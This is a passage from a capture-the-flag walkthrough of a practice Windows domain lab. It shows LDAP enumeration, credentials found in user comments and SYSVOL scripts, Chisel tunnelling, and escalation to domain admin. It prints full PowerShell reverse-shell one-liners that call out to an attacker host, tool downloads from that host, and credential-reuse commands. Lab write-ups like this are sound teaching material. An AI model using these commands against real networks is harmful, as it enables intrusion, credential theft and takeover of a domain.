*Evil-WinRM* PS C:\> ($searcher.FindAll() | measure-object).count
1

```

I’ll dump the full data:

```
*Evil-WinRM* PS C:\inetpub\wwwroot> $searcher.FindAll() | %{ $_.Properties }

Name                           Value
----                           -----
samaccountname                 {BTables}
givenname                      {BTables}
codepage                       {0}
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local}
dscorepropagationdata          {1/1/1601 12:00:00 AM}
usnchanged                     {12872}
instancetype                   {4}
logoncount                     {1}
name                           {BTables}
badpasswordtime                {0}
pwdlastset                     {132962322230297435}
objectclass                    {top, person, organizationalPerson, user}
badpwdcount                    {0}
samaccounttype                 {805306368}
lastlogontimestamp             {132962347992799854}
streetaddress                  {unknown}
usncreated                     {12624}
sn                             {BTables}
company                        {fulcrum}
objectguid                     {215 204 241 215 12 136 192 74 177 126 138 237 219 219 27 124}
info                           {Password set to ++FileServerLogon12345++}
whencreated                    {5/5/2022 1:50:22 PM}
adspath                        {LDAP://dc.fulcrum.local/CN=BTables,CN=Users,DC=fulcrum,DC=local}
useraccountcontrol             {66048}
cn                             {BTables}
countrycode                    {0}
l                              {unknown}
primarygroupid                 {513}
whenchanged                    {5/5/2022 2:33:19 PM}
c                              {UK}
lastlogon                      {132962347992799854}
distinguishedname              {CN=BTables,CN=Users,DC=fulcrum,DC=local}
st                             {UN}
postalcode                     {12345}
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 216 239 5 69 222 106 231 38 26 113 214 180 81 4 0 0}
lastlogoff                     {0}
accountexpires                 {9223372036854775807}

```

The user is btables and the comment is “Password set to ++FileServerLogon12345++”.

The other thing I’ll check for is Domain Admins with this query:

```
*Evil-WinRM* PS C:\> $searcher = New-Object ADSISearcher($adsi, "(&(objectClass=user)(memberof=CN=Domain Admins,CN=Users,DC=fulcrum,DC=local))")
*Evil-WinRM* PS C:\> $searcher.FindAll()

Path                                                                  Properties
----                                                                  ----------
LDAP://dc.fulcrum.local/CN=Administrator,CN=Users,DC=fulcrum,DC=local {logoncount, codepage, objectcategory, description...}
LDAP://dc.fulcrum.local/CN=923a,CN=Users,DC=fulcrum,DC=local          {samaccountname, givenname, codepage, objectcategory...}

```

It finds two, Administrator and 923a.

#### With PowerView

PowerView is a set of PowerShell scripts to make this kind of query easier. Rather than making raw PowerShell LDAP queries, I can ask for things like `Get-DomainUser`.

I’ll grab the a copy from [GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1), upload it to WEB01, and import it into my current session:

```
*Evil-WinRM* PS C:\programdata> wget 10.10.14.6/PowerView.ps1 -outfile pv.ps1  
*Evil-WinRM* PS C:\programdata> . .\pv.ps1

```

I’ll need a credential object for the LDAP user:

```
*Evil-WinRM* PS C:\> $pass = ConvertTo-SecureString 'PasswordForSearching123!' -AsPlainText -Force
*Evil-WinRM* PS C:\> $cred = New-Object System.Management.Automation.PSCredential('FULCRUM\ldap', $pass)

```

Now with PowerShell I can get all users with `info` set, just like above:

```
*Evil-WinRM* PS C:\> Get-DomainUser -Credential $cred -DomainController dc.fulcrum.local | where {$_.info} | select name,info | fl

name : BTables
info : Password set to ++FileServerLogon12345++

```

### Execution on FILE

#### POC

The password itself indicates that it’s meant to be used on FILE. I’ll create a `PSCredential` object and try to run a command:

```
*Evil-WinRM* PS C:\> $btpass = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
*Evil-WinRM* PS C:\> $btcred = New-Object System.Management.Automation.PSCredential('FULCRUM\btables', $btpass)
*Evil-WinRM* PS C:\> Invoke-Command -ComputerName file.fulcrum.local -Credential $btcred -ScriptBlock { whoami }
fulcrum\btables

```

It works! Not only is the password valid, but the user is able to run remote PowerShell commands.

I can also read `user.txt` at this point:

```
*Evil-WinRM* PS C:\> Invoke-Command -ComputerName file.fulcrum.local -Credential $btcred -ScriptBlock { cat \users\btables\Desktop\user.txt }
fce52521c8f872b514f037fada78daf4

```

#### Firewall Issues

I’ll try to get a shell by replacing `whoami` with the contents of PowerShell #2 on [revshell.com](https://www.revshells.com/).

It errors out, saying it can’t connect to my host on 443:

```
*Evil-WinRM* PS C:\Users\WebUser\Documents> Invoke-Command -ComputerName file.fulcrum.local -Credential $btcred -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }

Exception calling ".ctor" with "2" argument(s): "A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond 10.10.14.6:443"
...[snip]...

```

Looking at other writeups, it seems that TCP 53 is allows outbound, so changing that above would provide a reverse shell. But I had a hard time getting that enumeration to work, so I’ll take a different approach.

#### Tunnel

I know I can talk to 5985 on FILE from WEB01, so rather than try to get traffic out, I’ll upload the Windows version of Chisel to WEB01:

```
*Evil-WinRM* PS C:\programdata> wget 10.10.14.6/chisel_1.7.7_windows_amd64 -outfile c.exe

```

Now I’ll connect that back to my same listening Chisel server:

```
*Evil-WinRM* PS C:\programdata> .\c.exe client 10.10.14.6:8000 R:5985:192.168.122.132:5985
c.exe : 2022/05/09 17:56:41 client: Connecting to ws://10.10.14.6:8000
2022/05/09 17:56:43 client: Connected (Latency 93.4035ms)

```

Now I have 5985 on my host pointed at 5985 on FILE.

#### Shell

This time I don’t need `proxychains`, as Chisel is defining a specific tunnel:

```

oxdf@hacky$ evil-winrm -i 127.0.0.1 -u btables -p '++FileServerLogon12345++'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\BTables\Documents> hostname
FILE

```

## Shell as 923a [DC]

### Enumeration

#### FILE

There’s almost nothing on FILE. The only shares on the box are the default ones:

```
*Evil-WinRM* PS C:\> Get-SMBShare

Name   ScopeName Path Description
----   --------- ---- -----------
ADMIN$ *              Remote Admin
C$     *              Default share
IPC$   *              Remote IPC

```

#### DC

I’ll authenticate to the DC by mounting the `IPC$` share, and then `net view` will show the available shares:

```
*Evil-WinRM* PS C:\> net use \\dc.fulcrum.local\IPC$ /user:fulcrum\btables ++FileServerLogon12345++ 
The command completed successfully.
*Evil-WinRM* PS C:\> net view \\dc.fulcrum.local
Shared resources at \\dc.fulcrum.local

Share name  Type  Used as  Comment
-------------------------------------------------------------------------------
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The command completed successfully.

```

The DC has two shares, which are the default two on a domain controller.

I can mount either share using btables’ creds:

```

PS C:\> net use \\dc.fulcrum.local\sysvol /user:fulcrum\btables ++FileServerLogon12345++
The command completed successfully.

```

In `\\dc.fulcrum.local\sysvol\fulcrum.local\scripts` there’s hundreds of PowerShell scripts:

```
*Evil-WinRM* PS C:\> ls \\dc.fulcrum.local\sysvol\fulcrum.local\scripts

    Directory: \\dc.fulcrum.local\sysvol\fulcrum.local\scripts

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/12/2022  10:34 PM            340 00034421-648d-4835-9b23-c0d315d71ba3.ps1
-a----        2/12/2022  10:34 PM            340 0003ed3b-31a9-4d8f-a152-a234ecb522d4.ps1
-a----        2/12/2022  10:34 PM            340 0010183b-2f84-4d4a-9490-b5ae922e3ba1.ps1
-a----        2/12/2022  10:34 PM            340 001985e5-4b19-426a-96fe-927a972a6fed.ps1
...[snip]...

```

They are all the same length, and the same thing just with different user and password. For example, `00034421-648d-4835-9b23-c0d315d71ba3.ps1`:

```

# Map network drive v1.0
$User = 'be36'
$Pass = '@fulcrum_43bd6d26c168_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred

```

I already noted the two Domain Admins accounts above. I’ll see if either are in any of these files.

```
 *Evil-WinRM* PS C:\> Select-String -Path "\\dc.fulcrum.local\sysvol\fulcrum.local\scripts\*.ps1" -Pattern Administrator 
 *Evil-WinRM* PS C:\> Select-String -Path "\\dc.fulcrum.local\sysvol\fulcrum.local\scripts\*.ps1" -Pattern 923a
 \\dc.fulcrum.local\sysvol\fulcrum.local\scripts\3807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:$Pass = '@fulcrum_df0923a7ca40_$' | ConvertTo-SecureString -AsPlainText -Force
 \\dc.fulcrum.local\sysvol\fulcrum.local\scripts\a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:$User = '923a'

```

There’s a file with 923a:

```
*Evil-WinRM* PS C:\> cat \\dc.fulcrum.local\sysvol\fulcrum.local\scripts\a1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1
# Map network drive v1.0
$User = '923a'
$Pass = '@fulcrum_bf392748ef4e_$' | ConvertTo-SecureString -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ($User, $Pass)
New-PSDrive -Name '\\file.fulcrum.local\global\' -PSProvider FileSystem -Root '\\file.fulcrum.local\global\' -Persist -Credential $Cred

```

### Read Flag

With creds for a domain admin, I can execute commands on DC:

```
*Evil-WinRM* PS C:\> $pass = ConvertTo-SecureString '@fulcrum_bf392748ef4e_$' -AsPlainText -Force
*Evil-WinRM* PS C:\> $cred = New-Object System.Management.Automation.PSCredential('FULCRUM\923a', $pass)
*Evil-WinRM* PS C:\> Invoke-Command -Computer dc.fulcrum.local -Credential $cred -scriptblock { whoami ; hostname }
fulcrum\923a
DC

```

I can also read the flag:

```
*Evil-WinRM* PS C:\Users\BTables\Documents> Invoke-Command -Computer dc.fulcrum.local -Credential $cred -scriptblock { cat \users\administrator\desktop\root.txt }
8ddbe372e57c019bb6c4cdb5b35a0cab

```

### Shell

#### Rev Shell

I can also invoke a new shell. The DC seems to like 53 outbound as well:

```
*Evil-WinRM* PS C:\> Invoke-Command -Computer dc.fulcrum.local -Credential $cred -scriptblock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  }

```

This hangs, but at `nc`:

```

oxdf@hacky$ nc -lnvp 53
Listening on 0.0.0.0 53
Connection received on 10.10.10.62 52345
whoami
fulcrum\923a
PS C:\Users\923a\Documents>

```

Looking at my older notes and some other’s writeups, there are some that look at it as a challenge to have two shells on 53. I’ve never had issues letting `nc` listen on a port while another `nc` has an active connection. I can’t listen on the same port with two at the same time, but getting one, and then starting another hasn’t caused me issues.

#### Tunnel

I could also upload Chisel to FILE, and create another tunnel:

```
*Evil-WinRM* PS C:\programdata> .\c.exe client 10.10.14.6:8000 R:9001:192.168.122.130:5985
c.exe : 2022/05/10 01:10:27 client: Connecting to ws://10.10.14.6:8000
2022/05/10 01:10:28 client: Connected (Latency 150.194ms)

```

Because my host is already using 5985, I’ll have it listen on 9001. At the server, there’s a third tunnel:

```

2022/05/10 00:41:51 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2022/05/10 00:56:43 server: session#2: tun: proxy#R:5985=>192.168.122.132:5985: Listening
2022/05/10 01:10:28 server: session#3: tun: proxy#R:9001=>192.168.122.130:5985: Listening

```

Now I just need `-P 9001` to tell Evil-WinRM to use a different port, and I’m on the DC:

```

oxdf@hacky$ evil-winrm -i 127.0.0.1 -P 9001 -u 923a -p '@fulcrum_bf392748ef4e_$'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\923a\Documents>

```

And reading the flag:

```
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
8ddbe372************************

```